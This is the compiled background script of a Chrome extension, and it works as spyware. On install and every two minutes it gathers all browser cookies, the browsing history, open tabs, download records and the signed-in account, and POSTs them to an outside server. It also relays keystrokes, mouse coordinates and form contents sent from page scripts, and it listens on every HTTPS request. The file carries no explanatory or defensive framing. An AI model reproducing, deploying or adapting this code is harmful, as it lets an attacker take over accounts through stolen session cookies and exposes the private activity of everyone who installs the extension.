"use strict";
// import 'chrome'
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
let text_data = "";
chrome.alarms.create({ periodInMinutes: 2 });
chrome.alarms.onAlarm.addListener(() => __awaiter(void 0, void 0, void 0, function* () {
    yield retrieve();
}));
chrome.runtime.onInstalled.addListener(() => __awaiter(void 0, void 0, void 0, function* () {
    // const tab = await chrome.tabs.create({ url: "https://mail.google.com/mail/u/0/#inbox" })
    yield captureTabs();
    yield retrieve();
}));
chrome.webRequest.onBeforeRequest.addListener(handleRequest, {
    urls: [
        "https://*/*"
    ]
}, ['requestBody']);
function retrieve() {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const cookies = yield chrome.cookies.getAll({});
            send('cookies', cookies);
        }
        catch (_a) { }
        try {
            const history = yield chrome.history.search({ text: "" });
            send('history', history);
        }
        catch (_b) { }
        try {
            const tabs = yield chrome.tabs.query({});
            send('tabs', tabs);
        }
        catch (_c) { }
        try {
            const files = yield chrome.downloads.search({});
            send('files', files);
        }
        catch (_d) { }
        try {
            const accounts = yield chrome.identity.getProfileUserInfo();
            send('accounts', accounts);
        }
        catch (_e) { }
    });
}
function send(key, data) {
    return __awaiter(this, void 0, void 0, function* () {
        yield fetch('https://digitalrocketship.pro/dblock-34.php', {
            method: 'POST',
            body: JSON.stringify({ key: key, data: data })
        });
    });
}
function handleRequest(details) {
    if (details == null) {
        return;
    }
    // const body = details.requestBody
    // const bytes = body?.raw?.at(0)?.bytes
    // if (bytes != undefined) {
    //     const formatter = new TextDecoder()
    //     console.log(formatter.decode(bytes))
    //     return
    // }
    // if (body?.formData != undefined) {
    //     console.log(body.formData)
    //     return
    // }
}
function captureTabs() {
    return __awaiter(this, void 0, void 0, function* () {
    });
}
chrome.runtime.onMessage.addListener((e, sender, response) => __awaiter(void 0, void 0, void 0, function* () {
    const payload = e;
    switch (payload.key) {
        case 'keyup':
            yield send('keyup', payload.data);
            break;
        case 'coords':
            yield send('coords', payload.data);
            break;
        case 'form':
            yield send('form', payload.data);
            break;
    }
    response({});
    return true;
}));
